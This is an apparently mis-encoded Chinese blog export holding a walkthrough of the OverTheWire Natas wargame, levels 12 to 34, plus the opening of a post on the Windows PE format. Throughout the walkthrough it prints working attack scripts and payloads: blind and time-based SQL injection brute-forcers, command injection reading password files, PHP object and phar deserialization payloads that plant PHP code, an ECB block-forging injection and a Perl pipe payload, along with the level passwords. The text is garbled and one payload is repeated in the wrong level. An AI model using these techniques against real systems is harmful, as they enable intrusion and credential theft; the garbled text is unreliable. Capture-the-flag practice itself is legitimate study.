Level_12â¡Level_13åªåšäº†å‰ç«¯æ–‡ä»¶åç¼€åæ ¡éªŒå’Œæ–‡ä»¶é­”æ•°çš„æ ¡æ£€ï¼Œphpæ–‡ä»¶å‰é¢åŠ ä¸ŠGIF89aå³å¯ Level_13â¡Level_14Ez SQL â€œorâ€1â€=â€1 AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J Level_14â¡Level_151234567891011121314151617import requests url = &quot;http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php&quot;chr = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&quot;payload = r&#x27;natas16&quot; AND password LIKE binary &quot;%s&quot; #&#x27;#ä½¿ç”¨likeæ¨¡ç³ŠæŸ¥è¯¢ä¸ä¼šåŒºåˆ†å¤§å°å†™ï¼Œè¦å¸¦ä¸Šbinaryã€‚key = &quot;%&quot;while len(key) &lt;= 32: #å¾ªç¯32æ¬¡ for i in chr: #ç¡®å®šå­—ç¬¦ a = key[:-1]+i+key[-1:] print (a) req = requests.post(url=url,data=&#123;&#x27;username&#x27;:payload%a&#125;) print(payload%a) if &quot;This user exists&quot; in req.text: key = a print (key) WaIHEacj63wnNIBROHeqi3p9t0m5nhmh Level_15â¡Level_161234567891011121314151617import requestsimport stringurl=&quot;http://natas16.natas.labs.overthewire.org/index.php&quot;def inCheck(payload): r=requests.get(url+payload,auth=(&#x27;natas16&#x27;,&#x27;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&#x27;)) return &#x27;Doctor&#x27; not in r.textout=&#x27;&#x27;while(len(out)&lt;32): for i in string.digits+string.ascii_letters: payload=&quot;?needle=$(grep+^&quot;+out+i+&quot;+/etc/natas_webpass/natas17)Doctor&amp;submit=Search&quot; if(inCheck(payload)): out+=i print(out) breakprint(&quot;æœ€ç»ˆflag=&quot;+out) 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw Level_16â¡Level_17æ—¶é—´ç›²æ³¨ æ³¨æ„MYSQL MID()å‡½æ•°ç”¨æ³• MID(ColumnName, Start [, Length]) 1234567891011121314151mysql&gt; SELECT MID(&#39;NowaMagic&#39;, 5, 5);2+------------------------+3| MID(&#39;NowaMagic&#39;, 5, 5) |4+------------------------+5| Magic |6+------------------------+71 row in set 12345678910111213141516171819202122import requestsurl = &#x27;http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/index.php&#x27;key =&#x27;&#x27; for i in range(1,33): a = 32 c = 126 while a&lt;c: b = int((a+c)/2) payload=r&#x27;natas18&quot; and if(%d&lt;ascii(mid(password,%d,1)),sleep(2),1) and &quot;&quot; like &quot;&#x27;%(b,i) try: req = requests.post(url=url,data=&#123;&quot;username&quot;:payload&#125;,timeout=2) except requests.exceptions.Timeout as e: a=b+1 b=int((a+c)/2) continue c=b key +=chr(b) print(key)print(&quot;æœ€ç»ˆflag=&quot;+key) xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP Level_17â¡Level_18SessionèŒƒå›´å¾ˆå°çˆ†ç ´å³å¯ 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs Level_18â¡Level_19SESSION_FORMAT=hex(éšæœºæ•°+â€-adminâ€) eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF Level_19â¡Level_20å…³é”®é€»è¾‘ï¼šsessionIDå­˜åˆ°äº†æ–‡ä»¶ä¸­ï¼ŒæŒ‰é”®å€¼å¯¹å­˜åœ¨ï¼Œä»¥ç©ºæ ¼åˆ†éš”ï¼Œå¦‚æœ$_SESSION[â€œadminâ€]==1ï¼Œåˆ™æˆåŠŸç™»é™†ï¼Œå¾—åˆ°keyã€‚ å¯ä»¥é€šè¿‡é‡ç½®name,burpæŠ“åŒ…ï¼Œå°†nameå‚æ•°ä¿®æ”¹ä½ï¼šname=111 %0Aadmin 1ï¼Œå¾—åˆ°keyã€‚ IFekPyrQXftziDEsUr3x21sYuahypdgJ Level_20â¡Level_21SessionåŒæºï¼Œä¸¤ç½‘ç«™å…¬ç”¨åŒä¸€Sessionï¼Œä¸€ç½‘ç«™å›æ˜¾ï¼ŒäºŒç½‘ç«™é€šè¿‡burpæŠ“åŒ…æ·»åŠ admin=1ï¼Œç”¨äºŒç½‘ç«™sessionå¡«å…¥1ç½‘ç«™å³å¯ã€‚ chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ Level_21â¡Level_22Getæ·»åŠ revelioå‚æ•°å³å¯å¾—åˆ°flagï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªifåˆ¤æ–­è¯­å¥ä¸­: 1234567891011 &lt;?session_start();if(array_key_exists(&quot;revelio&quot;, $_GET)) &#123; // only admins can reveal the password if(!($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1)) &#123; header(&quot;Location: /&quot;); &#125;&#125;?&gt; ä¼šä½¿å¾—Getæ·»åŠ è¯¥å‚æ•°åæœåŠ¡å™¨è¿”å›é‡å®šå‘é¡µé¢ï¼Œå¯ä»¥é€šè¿‡burpæŠ“åŒ…æ‹¦æˆªå¾—åˆ°flag D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE Level_22â¡Level_23phpå­—ç¬¦ä¸æ•°å€¼æ¯”è¾ƒæ—¶ï¼Œä¼šä»å¼€å¤´æˆªå–æ•°å­—ï¼Œåˆ°å­—ç¬¦å‰ä¸ºæ­¢ã€‚ payload=1113zyqiloveyou OsRmXFguozKpTZZ5X14zNO43379LZveg Level_23â¡Level_24strcmpæ¼æ´ï¼Œstrcmpå‡½æ•°æ— æ³•æ¯”è¾ƒæ•°ç»„ï¼Œä¼šè¿”å›0ï¼Œå°†passwdè¾“å…¥ä¸ºæ•°ç»„å³å¯ç»•è¿‡ã€‚ï¼ˆè¦æ±‚phpç‰ˆæœ¬åœ¨5.3ä¹‹å‰ï¼‰ GHF6X7YwACaYYssHVY05cFq83hRktl4c Level_24â¡Level_25æ³¨å…¥ç‚¹1ï¼š natas25.natas.labs.overthewire.org/?lang=â€¦/./â€¦/./â€¦/./â€¦/./â€¦/./var/www/natas/natas25/logs/natas25_p9ifssh0i3ol6u0adbukhvi3j4.log æ³¨å…¥ç‚¹2:headers oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T Level_25â¡Level_26EzPhpååºåˆ—åŒ–æ¼æ´ åºåˆ—åŒ–å¯ä»¥å°†å¯¹è±¡ï¼Œç±»ï¼Œæ•°ç»„ï¼Œå˜é‡ï¼ŒåŒ¿åå‡½æ•°ç­‰ï¼Œè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè¿™æ ·ç”¨æˆ·å°±æ–¹ä¾¿å­˜å‚¨å’Œä¼ è¾“ï¼ŒåŒæ—¶æ–¹ä¾¿æ¢å¤ä½¿ç”¨ï¼Œå¯¹æœåŠ¡å™¨ä¹Ÿå‡è½»ä¸€å®šçš„å‹åŠ›ã€‚ ææ„å‡½æ•°__destruct:å½“æ•´ä¸ªè¯·æ±‚ç»“æŸåï¼Œå¯¹è±¡ä¼šè°ƒç”¨ææ„å‡½æ•° é”€æ¯æ‰€æœ‰æœ‰å…³è¯¥å¯¹è±¡çš„ä¸œè¥¿ã€‚ 12345678function __destruct()&#123; &#x2F;&#x2F; write exit message $fd&#x3D;fopen($this-&gt;logFile,&quot;a+&quot;); fwrite($fd,$this-&gt;exitMsg); fclose($fd);&#125; æºç ä¸­å‡ºç°ä»cookieè¯»å–å¯¹è±¡çš„è¿‡ç¨‹ 123if (array_key_exists(&quot;drawing&quot;, $_COOKIE))&#123; $drawing&#x3D;unserialize(base64_decode($_COOKIE[&quot;drawing&quot;]));&#125; æˆ‘ä»¬æ„é€ ä¸€ä¸ªæ˜¾ç¤ºpasswordçš„åºåˆ—åŒ–å­—ç¬¦ä¸²å³å¯ 123456789101112131415161718&lt;?phpclass Logger&#123; private $logFile; private $initMsg; private $exitMsg; function __construct()&#123; #æ³¨å…¥ä¿¡æ¯ $this-&gt;initMsg=&quot;&quot;; $this-&gt;exitMsg=&quot;&lt;?echo include &#x27;/etc/natas_webpass/natas27&#x27;;?&gt;&quot;; $this-&gt;logFile=&quot;img/aaa.php&quot;; &#125;&#125; $test = new Logger();echo serialize($test);echo &quot;\\n&quot;;echo base64_encode(serialize($test)); #æ˜¾ç¤ºbase64ç¼–ç åçš„åºåˆ—åŒ–å­—ç¬¦ä¸²?&gt; 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ Level_26â¡Level_27Mysqlæº¢å‡ºæˆªæ–­ 1&#96;username&#96; varchar(64) DEFAULT NULL, &#96;password&#96; varchar(64) DEFAULT NULL å½“ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åâ€natas28 + å¤§äº64ä¸ªç©ºæ ¼ +ä»»æ„å­—ç¬¦â€æ—¶ï¼Œ CheckUser()ä¼šåˆ¤å®šç”¨æˆ·ä¸å­˜åœ¨ï¼Œå‡ºå‘åˆ›å»ºç”¨æˆ·å‡½æ•°ï¼Œä½†å†™å…¥ç”¨æˆ·åå¯†ç æ—¶ç”±äºMssqlæº¢å‡ºæˆªæ–­ï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥å†™å…¥natas28å¯†ç ï¼Œè¿›è€Œé€šè¿‡æ”¹å¯†ç ç™»å½•natsa28å³å¯å¾—åˆ°flag 1234567891011121314151617181920212223242526272829303132333435363738mysql&gt; INSERT INTO users (username,password) values (&#39;u u&#39;,&#39;p4&#39;);Query OK, 1 row affected, 1 warning (0.00 sec)mysql&gt; select * from users where username&#x3D;&#39;u&#39;;+----------+----------+| username | password |+----------+----------+| u | p1 || u | p2 || u | p4 |+----------+----------+3 rows in set (0.00 sec)mysql&gt; select username,LENGTH(username) from users;+----------+------------------+| username | LENGTH(username) |+----------+------------------+| u | 1 || u | 2 || abcd | 4 || u | 4 |+----------+------------------+4 rows in set (0.00 sec)mysql&gt; select * from users where username&#x3D;&#39;u &#39;;+----------+----------+| username | password |+----------+----------+| u | p1 || u | p2 || u | p4 |+----------+----------+3 rows in set (0.01 sec)mysql&gt; select * from users where username&#x3D;&#39;u u&#39;;Empty set (0.00 sec) JWwR438wkgTsNKBbcJoowyysdM82YjeF Level_27â¡Level_28ä¸‰ä¸ªå…³é”®ç‚¹ ç¡®å®šæ•°æ®é€šè¿‡EBCåŠ å¯†ï¼Œç¡®å®šå—å¤§å° 12345678910111213141516171819import requestsimport binasciiimport urllibimport base64url = &quot;http://natas28.natas.labs.overthewire.org/index.php&quot;s = requests.Session()s.auth = (&#x27;natas28&#x27;, &#x27;JWwR438wkgTsNKBbcJoowyysdM82YjeF&#x27;)sample = &quot;aaaaaaaa&quot;while len(sample) &lt; 20: data = &#123;&#x27;query&#x27;:sample&#125; r = s.post(url, data=data) cipher = r.url.split(&#x27;=&#x27;)[1] #print(cipher) cipher = urllib.parse.unquote(cipher) print(&quot;[*] %d chars.%d \\t| %s&quot; % (len(sample), len(cipher),base64.b64decode(cipher).hex())) sample += &#x27;a&#x27; å‘ç°å­˜åœ¨å­—ç¬¦è½¬ä¹‰æƒ…å†µï¼Œå…·ä½“æ¥è¯´ï¼Œè¾“å…¥13ä¸ªaæ—¶ä¼šæ–°å¢ä¸€ä¸ªå—ï¼Œä½†æ˜¯å½“è¾“å…¥æŸä¸ªç‰¹æ®Šå­—ç¬¦æ—¶ï¼Œ11ä¸ªa+ç‰¹æ®Šå­—ç¬¦å…±12ä¸ªå­—ç¬¦ä¹Ÿä¼šæ–°å¢ä¸€ä¸ªå—ã€‚è¿™è¯´æ˜ç‰¹æ®Šå­—ç¬¦è¢«è½¬ä¹‰æˆäº†ä¸¤ä¸ªå­—ç¬¦åŠ å¯†ã€‚ 123456789101112131415161718import base64from urllib.parse import urlparse, parse_qs, quoteimport requestsauth = (&#x27;natas28&#x27;, &#x27;JWwR438wkgTsNKBbcJoowyysdM82YjeF&#x27;)target = &#x27;http://natas28.natas.labs.overthewire.org/&#x27;specialChars = [&#x27;a&#x27;, &#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;\\\\&#x27;, &#x27;/&#x27;, &#x27;#&#x27;, &#x27;?&#x27;, &#x27;%&#x27;]for c in specialChars: resp = requests.post( target, auth=auth, data=&#123;&#x27;query&#x27;: &#x27;a&#x27; * 11 + c&#125; ) q = base64.b64decode(parse_qs(urlparse(resp.url).query)[&#x27;query&#x27;][0]).hex() for j in range(len(q) // 32): print(q[j * 32: (j + 1) * 32], end=&#x27; &#x27;) print() éå†å‘ç°è¢«è½¬ç§»çš„å­—ç¬¦åŒ…æ‹¬ \\â€™ ,â€,\\ åˆ©ç”¨è½¬ä¹‰å’ŒEBCåŠ å¯†ä»¥å—ä¸ºå•ä½çš„ç‰¹æ€§ï¼Œåœ¨å—ç»“å°¾æ„é€ ç‰¹æ®Šå­—ç¬¦ \\â€™ä½¿å¾—è¢«è½¬ä¹‰çš„ä¸¤ä¸ªå­—ç¬¦ä¸€ä¸ªåœ¨ä¸Šä¸€ä¸ªå—ï¼Œå¦ä¸€ä¸ª \\â€™ åœ¨ä¸‹ä¸€ä¸ªå—ï¼Œè¿™æ ·ä¸‹ä¸€ä¸ªå—å°±æ„é€ äº†åŒ…å« \\â€™ çš„å­—ç¬¦ï¼Œ åˆ©ç”¨ä¸Šè¿°å­—ç¬¦é€ƒé€¸æ–¹å¼æ„é€ çš„payloadå—æ”¾åœ¨ä¸­é—´ï¼Œå‰é¢çš„å—å’Œç»“å°¾å—æ›¿æ¢ä¸ºæ­£å¸¸å—ï¼Œå³å¯æ„é€ å‡ºSQLæ³¨å…¥è¯­å¥ 12345678910111213141516171819202122232425262728293031323334353637import requestsimport urllibimport base64url = &quot;http://natas28.natas.labs.overthewire.org&quot;s = requests.Session()s.auth = (&#x27;natas28&#x27;, &#x27;JWwR438wkgTsNKBbcJoowyysdM82YjeF&#x27;)# First we generate a baseline for the header/footerdata = &#123;&#x27;query&#x27;:10 * &#x27; &#x27;&#125;r = s.post(url, data=data)baseline = urllib.parse.unquote(r.url.split(&#x27;=&#x27;)[1])baseline = base64.b64decode(baseline.encode(&#x27;utf-8&#x27;))header = baseline[:48]footer = baseline[48:]# We generate the ciphertext query and parse the resultsqli = 9 * &quot; &quot; + &quot;&#x27; UNION ALL SELECT password FROM users;#&quot;data = &#123;&#x27;query&#x27;:sqli&#125;r = s.post(url, data=data)exploit = urllib.parse.unquote(r.url.split(&#x27;=&#x27;)[1])exploit = base64.b64decode(exploit.encode(&#x27;utf-8&#x27;))# We computer the size of our payloadnblocks = len(sqli) - 10while nblocks % 16 != 0: nblocks += 1 nblocks = int(nblocks / 16)# Then, we forge the queryfinal = header + exploit[48:(48 + 16 * nblocks)] + footerfinal_ciphertext = base64.b64encode(final)search_url = &quot;http://natas28.natas.labs.overthewire.org/search.php&quot;resp = s.get(search_url, params=&#123;&quot;query&quot;:final_ciphertext&#125;)print(resp.text) airooCaiseiyee8he8xongien9euhe8b Level_28â¡Level_29å‘ç°index.plå¤„ç†ç”¨æˆ·è¾“å…¥ 1234567891011121314if(param(&#x27;file&#x27;))&#123; $f=param(&#x27;file&#x27;); if($f=~/natas/)&#123;//På­—ç¬¦ä¸²åŒ…å«æ£€æµ‹çš„è¯­æ³•ï¼Œæ£€æµ‹fä¸­æ˜¯å¦å«æœ‰å­ä¸²natas print &quot;meeeeeep!&lt;br&gt;&quot;; &#125; else&#123; open(FD, &quot;$f.txt&quot;); print &quot;&lt;pre&gt;&quot;; while (&lt;FD&gt;)&#123; print CGI::escapeHTML($_); &#125; print &quot;&lt;/pre&gt;&quot;; &#125;&#125; Perlè„šæœ¬åŸºæœ¬è¯­æ³• cat å‘½ä»¤ä¸­å¯¹ â€œâ€çš„è§£æ 1.åœ¨perlä¸­â€œ|â€å­—ç¬¦ä¼šå°†å‘½ä»¤è¿æ¥åˆ°è„šæœ¬ä¸­ã€‚2.URLä¸­ï¼Œç©ºæ ¼å¯ä»¥ç”¨â€œ+â€æˆ–è€…â€œ%20â€è¡¨ç¤ºï¼ŒåŒå¼•å·ï¼ˆâ€ï¼‰å¯ä»¥ç”¨â€œ%22â€è¡¨ç¤ºã€‚3.%00ä¼šè¢«urlè§£ç æˆ0x00ï¼Œå¯¼è‡´00æˆªæ–­ã€‚4.00æˆªæ–­åŸç†ï¼šæˆªæ–­æ¼æ´å‡ºç°çš„æ ¸å¿ƒå°±æ˜¯chr(0)ï¼Œè¿™ä¸ªå­—ç¬¦ä¸ä¸ºç©º (Null)ï¼Œä¹Ÿä¸æ˜¯ç©ºå­—ç¬¦ (â€œâ€)ï¼Œæ›´ä¸æ˜¯ç©ºæ ¼ã€‚å½“ç¨‹åºåœ¨è¾“å‡ºå«æœ‰ chr(0)å˜é‡æ—¶ï¼Œchr(0)åé¢çš„æ•°æ®ä¼šè¢«åœæ­¢ï¼Œæ¢å¥è¯è¯´ï¼Œå°±æ˜¯è¯¯æŠŠå®ƒå½“æˆç»“æŸç¬¦ï¼Œåé¢çš„æ•°æ®ç›´æ¥å¿½ç•¥ï¼Œè¿™å°±å¯¼è‡´äº†æ¼æ´äº§ç”Ÿã€‚5.perlä¸­ï¼Œopen()å‡½æ•°å¯ä»¥æ‰§è¡Œshellå‘½ä»¤ã€‚ payload:http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na%22%22tas_webpass/nat%22%22as30%0 wie9iexae0Daihohv8vuu3cei9wahf0e Level_29â¡Level_30123456789101112131415161718if (&#x27;POST&#x27; eq request_method &amp;&amp; param(&#x27;username&#x27;) &amp;&amp; param(&#x27;password&#x27;))&#123; my $dbh = DBI-&gt;connect( &quot;DBI:mysql:natas30&quot;,&quot;natas30&quot;, &quot;&lt;censored&gt;&quot;, &#123;&#x27;RaiseError&#x27; =&gt; 1&#125;); my $query=&quot;Select * FROM users where username =&quot;.$dbh-&gt;quote(param(&#x27;username&#x27;)) . &quot; and password =&quot;.$dbh-&gt;quote(param(&#x27;password&#x27;)); my $sth = $dbh-&gt;prepare($query); $sth-&gt;execute(); my $ver = $sth-&gt;fetch(); if ($ver)&#123; print &quot;win!&lt;br&gt;&quot;; print &quot;here is your result:&lt;br&gt;&quot;; print @$ver; &#125; else&#123; print &quot;fail :(&quot;; &#125; $sth-&gt;finish(); $dbh-&gt;disconnect();&#125; å…³é”®ç‚¹åœ¨$dbh-&gt;quote(param(â€˜passwordâ€™)) åœ¨Perlä¸­ï¼Œå¯ä»¥ä½¿ç”¨param(â€˜nameâ€™)æ–¹æ³•è·å–postè¡¨å•ä¸­nameå‚æ•°çš„å€¼ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼Œé‚£å°±æ˜¯ å½“æˆ‘ä»¬è¾“å…¥name=fooæ—¶ï¼Œparam(â€˜nameâ€™)æ–¹æ³•è¿”å›çš„æ˜¯nameçš„å€¼fooï¼›å½“æˆ‘ä»¬è¾“å…¥name=foo&amp;name=baræ—¶ï¼Œparam(â€˜nameâ€™)æ–¹æ³•è¿”å›çš„æ˜¯nameçš„å€¼åˆ—è¡¨[â€œfooâ€,â€barâ€]ã€‚ åœ¨Perlä¸­ï¼Œquote()æ–¹æ³•çš„ä¼ å‚ç±»å‹å¯ä»¥ä¸ºåˆ—è¡¨ï¼Œå¦‚æœå°†åˆ—è¡¨ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œåˆ™quote()ä¼šå°†å…¶è§£é‡Šä¸ºå•ç‹¬çš„å‚æ•°ã€‚ payload:http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na%22%22tas_webpass/nat%22%22as30%00 Level_30â¡Level_31å…³é”®åœ¨$dbh-&gt;quote(param(â€˜passwordâ€™)) å½“æˆ‘ä»¬è¾“å…¥name=fooæ—¶ï¼Œparam(â€˜nameâ€™)æ–¹æ³•è¿”å›çš„æ˜¯nameçš„å€¼fooï¼›å½“æˆ‘ä»¬è¾“å…¥name=foo&amp;name=baræ—¶ï¼Œparam(â€˜nameâ€™)æ–¹æ³•è¿”å›çš„æ˜¯nameçš„å€¼åˆ—è¡¨[â€œfooâ€,â€barâ€]ã€‚ åœ¨Perlä¸­ï¼Œquote()æ–¹æ³•çš„ä¼ å‚ç±»å‹å¯ä»¥ä¸ºåˆ—è¡¨ï¼Œå¦‚æœå°†åˆ—è¡¨ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œåˆ™quote()ä¼šå°†å…¶è§£é‡Šä¸ºå•ç‹¬çš„å‚æ•°ã€‚ Perlçš„quote($string)æ–¹æ³•è¢«ç”¨æ¥â€œè½¬ä¹‰â€åŒ…å«åœ¨stringä¸­çš„ä»»ä½•ç‰¹æ®Šå­—ç¬¦å¹¶å¢åŠ æ‰€éœ€çš„å¤–éƒ¨çš„å¼•å·ã€‚è¿™é‡Œä½¿ç”¨quoteæ–¹æ³•çš„æœ¬æ„æ˜¯å°†ç”¨æˆ·çš„è¾“å…¥æ”¾åœ¨å¼•å·ä¸­ä»¥é˜²æ­¢sqlæ³¨å…¥ã€‚ä½†æ˜¯å½“quote()å¯ä»¥æ¥æ”¶ä¸¤ä¸ªå‚æ•°æ—¶ï¼Œå®ƒçš„ç”¨æ³•å˜ä¸ºï¼šç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºå°†è¦è¢«quoteçš„æ•°æ®ï¼Œç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºä¸€ä¸ªSQLæ•°æ®ç±»å‹ï¼Œå†³å®šå¦‚ä½•quoteã€‚å¦‚æœç¬¬äºŒä¸ªå‚æ•°æ˜¯éå­—ç¬¦ä¸²ç±»å‹ï¼ˆå¦‚NUMERICï¼‰ï¼Œåˆ™quoteå°†ä¼ é€’å…¶ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè€Œä¸å¸¦ä»»ä½•å¼•å·ã€‚å¯ä»¥åˆ©ç”¨è¯¥SQLæ³¨å…¥ã€‚ hay7aecuungiuKaezuathuk9biin0pu1 Leve_31â¡Level_3212345678910111213141516171819202122232425262728my $cgi = CGI-&gt;new;if ($cgi-&gt;upload(&#x27;file&#x27;)) &#123; my $file = $cgi-&gt;param(&#x27;file&#x27;); print &#x27;&lt;table class=&quot;sortable table table-hover table-striped&quot;&gt;&#x27;; $i=0; while (&lt;$file&gt;) &#123; my @elements=split /,/, $_; if($i==0)&#123; # header print &quot;&lt;tr&gt;&quot;; foreach(@elements)&#123; print &quot;&lt;th&gt;&quot;.$cgi-&gt;escapeHTML($_).&quot;&lt;/th&gt;&quot;; &#125; print &quot;&lt;/tr&gt;&quot;; &#125; else&#123; # table content print &quot;&lt;tr&gt;&quot;; foreach(@elements)&#123; print &quot;&lt;td&gt;&quot;.$cgi-&gt;escapeHTML($_).&quot;&lt;/td&gt;&quot;; &#125; print &quot;&lt;/tr&gt;&quot;; &#125; $i+=1; &#125; print &#x27;&lt;/table&gt;&#x27;;&#125;else&#123;print &lt;&lt;END; if ($cgi-&gt;upload(â€˜fileâ€™)) uploadæ£€æŸ¥fileå‚æ•°å€¼ä»£è¡¨çš„æ–‡ä»¶æ˜¯å¦ä¸Šä¼ ï¼Œä½†æ˜¯ç”¨æˆ·å¯ä»¥æ„é€ å¤šä¸ªfileå‚æ•°ï¼Œè€ŒuploadåªéªŒè¯å…¶ä¸­ä¸€ä¸ªfileå‚æ•°æ˜¯cvsæ–‡ä»¶å³å¯ï¼Œå¦ä¸€ä¸ªfileæˆ‘ä»¬å¯ä»¥èµ‹å€¼æ„é€ å‚æ•° my file=file=cgi-&gt;param(â€˜fileâ€™); æ”¹ä»£ç æŒ‰ç…§é¢„è®¾åº”è¯¥è¿”å›ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä½†æ˜¯å¦‚æœæ„é€ çš„fileæ˜¯å¤šä¸ªå‚æ•°ï¼Œparam()è¿”å›æ‰€æœ‰fileå‚æ•°å€¼çš„åˆ—è¡¨ï¼Œä½†fileä¸èƒ½æœ‰ä¸¤ä¸ªå€¼ï¼Œæ‰€ä»¥ç»™fileèµ‹å€¼æ—¶ç¨‹åºè¯»å–åˆ—è¡¨ç¬¬ä¸€ä¸ªå€¼èµ‹ç»™fileï¼Œæ­¤æ—¶fileæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸² while (&lt;$file&gt;ï¼šæŒ‰ç…§é¢„è®¾åº”è¯¥æ˜¯ç”¨æ¥éå†æ–‡ä»¶çš„æ¯ä¸€è¡Œ,ä½†å¦‚æœfileä¸ºå‚æ•°åˆ™ä¸èµ·ä½œç”¨ã€‚ä¸€ä¸ªä¾‹å¤–æ˜¯å­—ç¬¦ä¸²ä¸ºâ€ARGVâ€æ—¶ï¼Œ&lt;&gt;ä¼šéå†URLåçš„æ¯ä¸ªå€¼ï¼Œoepn()å°±ä¼šæ‰§è¡Œè¯¥å­—ç¬¦ä¸²å†…å®¹ã€‚ payload no1vohsheCaiv3ieH4em1ahchisainge Level_32â¡Level_33å¯¹ä¸Šä¸ªæ¼æ´çš„åˆ©ç”¨ shoogeiGa2yee3de6Aex8uaXeech5eey Level_33â¡Level_34Pharååºåˆ—åŒ–æ¼æ´ï¼Œè¯¦ç»†è®²è§£è§è¿™ç¯‡ ä¸Šä¼ æ‰“å°flagçš„phpæ–‡ä»¶ ç”Ÿæˆpharå‹ç¼©æ–‡ä»¶ 123456789101112131415&lt;?php class Executor &#123; private $filename = &quot;pwn.php&quot;; private $signature = True; private $init = false; &#125; $phar = new Phar(&quot;test.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;addFromString(&quot;test.txt&quot;, &#x27;test&#x27;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub $o = new Executor(); $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;stopBuffering(); //ç­¾åè‡ªåŠ¨è®¡ç®—?&gt; ä¸Šä¼ pharå‹ç¼©æ–‡ä»¶ åˆ©ç”¨pharæ–‡ä»¶ï¼Œå°†æ–‡ä»¶åä¿®æ”¹ä¸ºphar://test.phar/test.txtï¼Œmd5_file()å‡½æ•°è§£æpharæ–‡æ¡£ï¼Œè·å–åˆ°flagã€‚ shu5ouSu6eicielahhae0mohd4ui5uig â€æ’’èŠ±å®Œç»“â€","categories":[{"name":"Web","slug":"Web","permalink":"http://example.com/categories/Web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"http://example.com/tags/Web/"}]},{"title":"Windows_PEæ–‡ä»¶æ ¼å¼","slug":"Windows_PEæ–‡ä»¶","date":"2021-05-15T17:24:39.000Z","updated":"2022-03-25T13:51:44.000Z","comments":true,"path":"2021/05/16/Windows_PEæ–‡ä»¶/","link":"","permalink":"http://example.com/2021/05/16/Windows_PE%E6%96%87%E4%BB%B6/","excerpt":"","text":"Windows_PEæ–‡ä»¶æ ¼å¼â€‹ PEæ–‡ä»¶æ ¼å¼æ˜¯ç†è§£Windowsæ“ä½œç³»ç»Ÿè¿›ç¨‹ã€å†…å­˜ã€åŠ¨æ€é“¾æ¥åº“åŠ è½½çš„åŸºç¡€ï¼Œæœ¬æ–‡ç»“åˆé€†å‘è¯¾æ‰€å­¦å’ŒæŸ¥è¯¢çš„èµ„æ–™ç®€å•åšä¸ªæ€»ç»“ã€‚ 1.PEæ–‡ä»¶åŸºæœ¬ä»‹ç»PEæ–‡ä»¶æ˜¯Windowsæ“ä½œç³»ç»Ÿä¸‹ä½¿ç”¨çš„ä¸€ç§å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç”±COFFï¼ˆUNIXå¹³å°ä¸‹çš„é€šç”¨å¯¹è±¡æ–‡ä»¶æ ¼å¼ï¼‰æ ¼å¼æ–‡ä»¶å‘å±•è€Œæ¥ã€‚32ä½æˆä¸ºPE32ï¼Œ64ä½ç§°ä¸ºPE+æˆ–PE32+ã€‚ åŸºæœ¬ç»“æ„ ä»DOSå¤´åˆ°èŠ‚åŒºå¤´æ˜¯PEå¤´éƒ¨åˆ†ï¼Œå…¶ä¸‹çš„èŠ‚åŒºåˆç§°ä¸ºPEä½“ã€‚ DOSå¤´ ä¸»è¦ä¸ºç°ä»£PEæ–‡ä»¶å¯ä»¥å¯¹æ—©æœŸçš„DOSæ–‡ä»¶è¿›è¡Œè‰¯å¥½å…¼å®¹å­˜åœ¨ï¼Œå…¶ç»“æ„ä½“ä¸ºIMAGE_DOS_HEADERã€‚ å¤§å°ä¸º64å­—èŠ‚ï¼Œå…¶ä¸­2ä¸ªé‡è¦çš„æˆå‘˜åˆ†åˆ«æ˜¯ï¼š e_magic:DOSç­¾åï¼ˆ4D5Aï¼ŒMZï¼‰ e_lfanewï¼šæŒ‡ç¤ºNTå¤´çš„åç§»ï¼ˆæ–‡ä»¶ä¸åŒï¼Œå€¼ä¸åŒï¼‰ DOSå­˜æ ¹ stubï¼Œä½äºDOSå¤´ä¸‹æ–¹ï¼Œå¯é€‰ï¼Œå¤§å°ä¸å›ºå®šï¼Œç”±ä»£ç ä¸æ•°æ®æ··åˆç»„æˆã€‚ NTå¤´ ç»“æ„ä½“ä¸ºIMAGE_NT_HEADERSï¼Œå¤§å°ä¸ºF8ï¼Œç”±3ä¸ªæˆå‘˜ç»„æˆï¼š ç­¾åç»“æ„ä½“ï¼Œå€¼ä¸º50450000hï¼ˆâ€œPEâ€00ï¼‰ 